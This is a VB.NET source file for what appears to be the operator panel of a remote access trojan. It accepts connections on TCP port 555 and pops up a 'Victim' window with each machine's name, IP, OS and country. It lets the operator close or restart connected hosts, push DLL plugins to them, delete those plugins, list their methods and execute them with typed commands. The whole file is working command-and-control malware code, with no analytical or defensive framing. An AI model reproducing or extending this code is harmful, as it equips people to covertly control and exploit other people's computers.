Imports System.Net.Sockets, System.IO, System.Threading, System.Runtime.InteropServices
Public Class Form1

    Public Online As New List(Of USER)
    Dim spliter As String = "[||SPLT||]"
    Public ImagesB(1024 * 1024) As Byte
    Public open As Boolean = False

    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        End
    End Sub
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Control.CheckForIllegalCrossThreadCalls = False
        FileIO.FileSystem.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\PlugControl_Images")
        Dim a As New Thread(AddressOf Accp)
        a.Start()
    End Sub
    Sub Accp()
        Dim list As New TcpListener(555)
        list.Start()
        While True
            Dim NEW_USER As New USER(list.AcceptTcpClient)
            AddHandler NEW_USER.Recive, AddressOf Recive
            AddHandler NEW_USER.DesConnect, AddressOf DesConnect
        End While
    End Sub
    Private Delegate Sub DRecive(ByVal USER As USER, ByVal Bytes As Byte())

    Sub Recive(ByVal USER As USER, ByVal Bytes As Byte())
        If B2T(Bytes).Contains(spliter) = False Then Exit Sub
        Dim p As List(Of Byte()) = SplitBytes(Bytes, spliter)
        Dim l As String = B2T(p.Item(0))
        Select Case l
            Case "Info"
                Online.Add(USER)
                USER.ID = USER.ipP & "/" & B2T(p(2))
                Dim o = ListView1.Items.Add(USER.ID)
                o.SubItems.Add(USER.ip)
                o.SubItems.Add(B2T(p(1)))
                o.SubItems.Add(B2T(p(2)))
                o.SubItems.Add(B2T(p(3)))
                o.ImageKey = o.SubItems(4).Text & ".png".ToLower
                Dim j As String() = Split(B2T(p(4)), "||")
                If j.Length = 0 Then o.SubItems.Add("0")
                Dim q As New List(Of String)
                For x = 0 To j.Length - 2
                    q.Add(j(x))
                Next
                USER.MyPlugins = q.ToArray
                o.SubItems.Add(j.Length - 1)
j:
                Victim.A = "Name : " & o.Text
                Victim.B = "IP   : " & o.SubItems(1).Text
                Victim.C = "OS   : " & o.SubItems(2).Text
                Victim.D = "Country   : " & o.SubItems(4).Text
                Victim.ShowInTaskbar = False
                Victim.ShowDialog()
            Case "Plugins"
                If B2T(p(1)) = "Null" Then ListView3.Items.Clear()
                Dim q As New List(Of String)
                For x = 1 To p.Count - 2
                    q.Add(B2T(p(x)))
                Next
                USER.MyPlugins = q.ToArray
                ListView1_SelectedIndexChanged(Nothing, Nothing)
            Case "Methors"
                ListView2.Items.Clear()
                If ListView3.SelectedItems(0).Text = B2T(p(1)) Then
                    For i = 2 To p.Count - 1
                        Dim j As String = B2T(p(i))
                        If j = "ToString" Or j = "Equals" Or j = "GetHashCode" Or j = "GetType" Or j = ".ctor" Or j = "" Or l.Contains(" ") = True Then
                        Else
                            ListView2.Items.Add(B2T(p(i)))
                        End If
                    Next
                End If
            Case "Recive"
                Dim f2 As New Form2
                Try
                    If B2T(p(1)).ToLower.Contains("png") Then
                        f2.TextBox1.Visible = False
                        f2.PictureBox1.Visible = True
                        Dim mem As New MemoryStream(p(1))
                        f2.PictureBox1.Image = Image.FromStream(mem)
                        mem.Close()
                    Else '
                        f2.TextBox1.Visible = True
                        f2.PictureBox1.Visible = False
                        Dim texty As String = B2T(p(1))
                        If texty.Contains("[IVsongokuDZ]") Then
                            texty.Replace("[IVsongokuDZ]", "png")
                        End If
                        f2.TextBox1.Text = texty
                    End If
                    Application.Run(f2)
                Catch ex As Exception
                    MsgBox(ex.Message)
                End Try
                


        End Select

    End Sub



    Sub MySub()
        Application.Run(Form2)
    End Sub


    Sub DesConnect(ByVal user As USER)
        Online.Remove(user)
        For Each x As ListViewItem In ListView1.Items
            If x.Text = user.ID Then
                If x.Selected = True Then
                    ListView3.Items.Clear()
                    ListView2.Items.Clear()
                End If
                x.Remove()
            End If
        Next
    End Sub
    Private Sub CloseUserToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseUserToolStripMenuItem.Click
        For Each x As ListViewItem In ListView1.SelectedItems
            For Each y As USER In Online
                If x.Text = y.ID Then
                    y.Send(T2B("Close" & spliter))
                End If
            Next
        Next
    End Sub

    Private Sub RestartUserToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartUserToolStripMenuItem.Click
        For Each x As ListViewItem In ListView1.SelectedItems
            For Each y As USER In Online
                If x.Text = y.ID Then
                    y.Send(T2B("Restart" & spliter))
                End If
            Next
        Next
    End Sub

    Private Sub ListView1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ListView1.SelectedIndexChanged
        ListView3.Items.Clear()
        ListView2.Items.Clear()
        For Each x As ListViewItem In ListView1.SelectedItems
            For Each y As USER In Online
                If x.Text = y.ID Then
                    If y.MyPlugins.Length = 0 Then Exit Sub
                    For z = 0 To y.MyPlugins.Length - 1
                        ListView3.Items.Add(y.MyPlugins(z), 0)
                    Next
                    x.SubItems(5).Text = ListView3.Items.Count
                End If
            Next
        Next
    End Sub
#Region "Functions"
    Function T2B(ByVal Text As String) As Byte()
        Return System.Text.Encoding.UTF8.GetBytes(Text)
    End Function
    Function B2T(ByVal Bytes As Byte()) As String
        Return System.Text.Encoding.UTF8.GetString(Bytes)
    End Function
    Function JoinBytes(ByVal Bytes1 As Byte(), ByVal Bytes2 As Byte(), ByVal Spliters As String) As Byte()
        Dim B(Bytes1.Length + Bytes2.Length + Spliters.Length + Spliters.Length) As Byte
        Bytes1.CopyTo(B, 0)
        Dim S As Byte() = T2B(Spliters)
        S.CopyTo(B, Bytes1.Length)
        Bytes2.CopyTo(B, Bytes1.Length + Spliters.Length)
        Dim n As Byte() = T2B(Spliters)
        n.CopyTo(B, Bytes1.Length + Spliters.Length + Bytes2.Length)
        Return B
    End Function
    Function SplitBytes(ByVal Bytes As Byte(), ByVal Spliter As String) As List(Of Byte())
        Dim oo As New List(Of Byte())
        Dim gg As String() = Split(B2T(Bytes), Spliter)
        For x = 0 To gg.Length - 1
            Dim offest As Integer = 0
            For o = 0 To oo.Count - 1
                offest += oo.Item(o).Length
            Next
            offest += (x * Spliter.Length)
            Dim ll As New IO.MemoryStream
            ll.Write(Bytes, offest, gg(x).Length)
            oo.Add(ll.ToArray)
            ll.Close()
        Next
        Return oo
    End Function
#End Region

    Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem1.Click

        Dim gg = InputBox("Enter Your Plugin Name ,  " & vbNewLine & "Must Equal Dll Project Name :")
        If gg.Contains(".dll") Then MessageBox.Show("Project Name Should Be without .dll", "Plugin Control", MessageBoxButtons.OK, MessageBoxIcon.Warning) : Exit Sub
        If gg = "" Then Exit Sub
        If gg.Contains(" ") Then MessageBox.Show("Plugin Name Must Be Without Space", "Plugin Control", MessageBoxButtons.OK, MessageBoxIcon.Warning) : Exit Sub Else If gg = "" Then Exit Sub

        Dim k As New OpenFileDialog
        If k.ShowDialog = Windows.Forms.DialogResult.OK Then
            For Each x As ListViewItem In ListView1.SelectedItems
                For Each y As USER In Online
                    If x.Text = y.ID Then
                        y.Send(JoinBytes(T2B("N!$Plugin-|{/\}|-" & gg), My.Computer.FileSystem.ReadAllBytes(k.FileName), spliter))
                        MessageBox.Show("Plugin Sent SucessFull", "Plugin Control", MessageBoxButtons.OK, MessageBoxIcon.Information)
                    End If
                Next
            Next
        End If
        End Sub

    Private Sub ToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem2.Click
        For Each x As ListViewItem In ListView1.SelectedItems
            For Each y As USER In Online
                If x.Text = y.ID Then
                    y.Send(T2B("DPlugin" & spliter & ListView3.SelectedItems(0).Text & ".dll" & spliter))
                    MessageBox.Show("This Plugin Will Be Deleted After You Restart Server", "Plugin Control", MessageBoxButtons.OK, MessageBoxIcon.Information)
                End If
            Next
        Next
    End Sub
    Private Sub ListView3_Click(sender As Object, e As EventArgs) Handles ListView3.Click
        If ListView3.SelectedItems.Count = 0 Then Exit Sub
        For Each x As ListViewItem In ListView1.SelectedItems
            For Each y As USER In Online
                If x.Text = y.ID Then
                    y.Send(T2B("GetMethors" & spliter & ListView3.SelectedItems(0).Text & spliter))
                End If
            Next
        Next
    End Sub

    Private Sub ToolStripMenuItem3_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem3.Click
        Dim kl As String = InputBox("Enter Your Commend Line ")
        For Each x As ListViewItem In ListView1.SelectedItems
            For Each y As USER In Online
                If x.Text = y.ID Then
                    y.Send(T2B("RPlugin" & spliter & ListView3.SelectedItems(0).Text & spliter & ListView2.SelectedItems(0).Text & spliter & kl & spliter))
                End If
            Next
        Next
    End Sub


End Class



Public Class USER
    Public Property Methoers As New List(Of String)
    Dim MyM As New MemoryStream
    Public Property MyPlugins As String()
    Public Property ip As String = Nothing
    Public Property ipP As String = Nothing
    Public Property ID As String
    Dim TCP As New TcpClient
    Public Event Recive(ByVal User As USER, ByVal Bytes As Byte())
    Public Event DesConnect(ByVal user As USER)
    Dim data(4096 * 4096) As Byte
    Sub New(ByVal T As TcpClient)
        TCP = T
        TCP.ReceiveTimeout = 5000
        TCP.SendTimeout = 5000
        TCP.GetStream.BeginRead(data, 0, data.Length, AddressOf REC, Nothing)
        ipP = TCP.Client.RemoteEndPoint.ToString
        ip = Split(TCP.Client.RemoteEndPoint.ToString, ":")(0)
    End Sub
    Dim le As Integer
    Sub REC(ByVal ar As IAsyncResult)

        Try
            'MsgBox(TCP.GetStream.EndRead(ar))
            Dim aa = TCP.GetStream.EndRead(ar)
            If aa > 0 Then
            Else
                RaiseEvent DesConnect(Me)
                Exit Sub
            End If
            RaiseEvent Recive(Me, data)
            Array.Clear(data, 0, data.Length)
            TCP.GetStream.BeginRead(data, 0, data.Length, AddressOf REC, Nothing)
        Catch ex As Exception
            TCP.Close()
            RaiseEvent DesConnect(Me)
        End Try
    End Sub
    Sub Send(ByVal Bytes As Byte())
        TCP.GetStream.BeginWrite(Bytes, 0, Bytes.Length, Nothing, Nothing)
    End Sub
End Class

